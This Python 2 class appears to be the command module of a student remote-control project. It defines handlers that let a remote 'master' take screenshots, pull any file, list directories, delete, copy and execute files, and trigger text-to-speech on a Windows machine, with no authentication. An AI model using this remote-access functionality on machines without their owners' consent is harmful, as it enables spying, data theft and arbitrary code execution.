# Tal's Commands Class
# Version 6 - 14.2.19

import os
import subprocess
from shutil import copy
from PIL import ImageGrab
import win32com.client as cl
import sys


class Commands(object):
    """-----------------THE COMMAND DICTIONARY-----------------"""
    @staticmethod
    def __commands():
        """
        The commands in the format of - command's name : (command's function, command's parameters)
        :return:
        """
        return {'Take Screen Shot': (Commands.__take_screenshot_request, Commands.__print_response, ['Picture Name']),
                'Download File': (Commands.__send_file_request, Commands.__send_file_response, ['File Name']),
                'Dir': (Commands.__dir_request, Commands.__print_response, ['Directory']),
                'Delete File': (Commands.__delete_request, Commands.__print_response, ['File Name']),
                'Copy File': (Commands.__copy_request, Commands.__print_response, ['Source', 'Destination']),
                'Execute': (Commands.__execute_request, Commands.__print_response, ['Executable File']),
                'Text To Speech': (Commands.__text_to_speech_request, Commands.__print_response, ['The Text To Say']),
                'Disconnect': (Commands.__disconnect_request, Commands.__print_response, [])}

    """-----------------THE CONSTS-----------------"""
    # the number of digits the length of the messages sending
    SIZE_LENGTH = 10
    # the number of digits the length of a command
    COMMAND_LENGTH = 1
    # the special character that separates params' elements and command number
    SEPARATE_CHAR = '~'
    # the number of images taken
    __image_number = 0
    # the number of files downloaded
    __file_number = 0
    # indexes in the dictionary
    __REQUEST_INDEX = 0
    __RESPONSE_INDEX = 1
    __PARAM_INDEX = 2

    """-----------------COMMANDS REQUESTS HANDLERS-----------------"""

    @staticmethod
    def __take_screenshot_request(picture_name=""):
        # take a screen shot
        im = ImageGrab.grab()
        # if there is no given name to the image
        if picture_name == "":
            # set the image's name to be image + image number
            picture_name = os.getcwd() + "\\image%d.png" % Commands.__image_number
            # increase the number of images
            Commands.__image_number += 1
        # check if the given name ends with '.png'
        else:
            # if not then add to the end of the name
            if picture_name[-4:] != ".png":
                picture_name += ".png"

        # save the image with the image name as a png image
        im.save(picture_name, "PNG")
        # return "saved at " + the picture's name
        return "Saved at " + str(picture_name)

    @staticmethod
    def __copy_request(src, dest):
        # if file doesn't exist, return SystemError
        if not os.path.exists(src):
            return SystemError("%s Doesn't Exist" % src)
        # if the file's name isn't a file, return SystemError
        if not os.path.isfile(src):
            return SystemError("%s Isn't A File" % src)
        copy(src, dest)
        return 'Copied %s to %s' % (str(src), str(dest))

    @staticmethod
    def __execute_request(to_execute):
        # if file doesn't exist, return SystemError
        if not os.path.exists(to_execute):
            return SystemError("%s Doesn't Exist" % to_execute)
        # if the file's name isn't a file, return SystemError
        if not os.path.isfile(to_execute):
            return SystemError("%s Isn't A File" % to_execute)
        subprocess.call(to_execute)
        return 'Executed %s' % str(to_execute)

    @staticmethod
    def __delete_request(to_delete):
        # if item doesn't exist, return SystemError
        if not os.path.exists(to_delete):
            return SystemError("%s Doesn't Exist." % to_delete)
        os.remove(to_delete)
        return 'Deleted %s' % str(to_delete)

    @staticmethod
    def __dir_request(directory):
        # if directory doesn't exist, return SystemError
        if not os.path.exists(directory):
            return SystemError("%s Doesn't Exist." % directory)
        # if directory's name isn't a directory, return SystemError
        if not os.path.isdir(directory):
            return SystemError("%s Isn't A Directory." % directory)
        files_list = os.listdir(directory)
        string = "\nFiles in '" + directory + "':\n"
        for f in files_list:
            string += str(f) + '\n'
        return string

    @staticmethod
    def __send_file_request(file_name):
        # if file doesn't exist, return SystemError
        if not os.path.exists(file_name):
            return SystemError("%s Doesn't Exist" % file_name)
        # if the file's name isn't a file, return SystemError
        if not os.path.isfile(file_name):
            return SystemError("%s Isn't A File" % file_name)
        # get the file's data as binary data
        with open(file_name, "rb") as f:
            data = f.read()
        # get the file's type
        typ = file_name[file_name.rfind('.')+1:]
        # return : {file's type}{separate char}{data}
        return typ + Commands.SEPARATE_CHAR + data

    @staticmethod
    def __text_to_speech_request(text):
        if text == "":
            raise ValueError("Text To Speech Got Empty String")
        sp = cl.Dispatch("SAPI.SpVoice")
        sp.Speak(text)
        return 'Said "%s"' % text

    @staticmethod
    def __disconnect_request():
        return 'Bye bye'

    @staticmethod
    def __print_response(response):
        return str(response)

    @staticmethod
    def __send_file_response(typ, *data):
        # build the file name
        filename = "f%d.%s" % (Commands.__file_number, typ)
        Commands.__file_number += 1
        # open it and write inside it all the data
        with open(filename, 'wb') as f:
            f.write(Commands.SEPARATE_CHAR.join(data))
        return "Saved at '" + os.getcwd() + "\\" + filename + "'"

    """-----------------COMMANDS RELATED PUBLIC FUNCTIONS-----------------"""

    @staticmethod
    def command_number(command):
        """
        :param command: the command's name
        :return: the command's number as a string, padded with 0 at the start (if needed)
        """
        command_num = str(Commands.__commands().keys().index(command))
        while len(command_num) < Commands.COMMAND_LENGTH:
            command_num = '0' + command_num
        return command_num

    @staticmethod
    def get_commands_names():
        """
        :return: the commands' names
        """
        return Commands.__commands().keys()

    @staticmethod
    def handle_command_request(command_number, args):
        """
        :param command_number: the command's number
        :param args: a list of arguments to the command's request handler
        :return: the command's request return value
        """
        # get all the command's
        commands = Commands.__commands()
        # get the handle request function
        handle_request_function = commands[commands.keys()[command_number]][Commands.__REQUEST_INDEX]
        # set the default response to not enough parameters
        response = "ERROR: Not Enough Parameters With %s Command" % commands.keys()[command_number]
        # try to execute the request adn return it's result
        try:
            return handle_request_function(*args)
        # if not enough parameters
        except TypeError as e:
            # notify the master about how many parameters were given, and how many needed
            nums = [int(s) for s in e.message if s.isdigit()]
            return "ERROR: %s Command Got %d Parameters. Expected %d." %\
                   (commands.keys()[command_number], nums[0], nums[1])
        except SystemError as e:
            # return the response
            return "ERROR: In %s Command: %s" % (commands.keys()[command_number], e.message)

    @staticmethod
    def handle_command_response(command_number, args):
        """
        :param command_number: the command's number
        :param args: a list of arguments to the command's response handler
        :return: the command's response return value
        """
        sys.__stdout__.write(str(args))
        commands = Commands.__commands()
        return commands[commands.keys()[command_number]][Commands.__RESPONSE_INDEX](*args)

    @staticmethod
    def get_commands_parameters(command_name):
        """
        Returns the command's parameters
        :param command_name: the command's name
        :return: the given command's parameters
        """
        commands = Commands.__commands()
        if command_name not in commands:
            return []
        return commands[command_name][Commands.__PARAM_INDEX]

    """-----------------HELPER PUBLIC FUNCTIONS-----------------"""

    @staticmethod
    def pad_length(length):
        """
        :param length: the request's length we want to send to the client
        :return: returns the length, in string, padded with 0 at the start (if needed)
        """
        length = str(length)
        while len(length) < Commands.SIZE_LENGTH:
            length = "0" + length
        return length
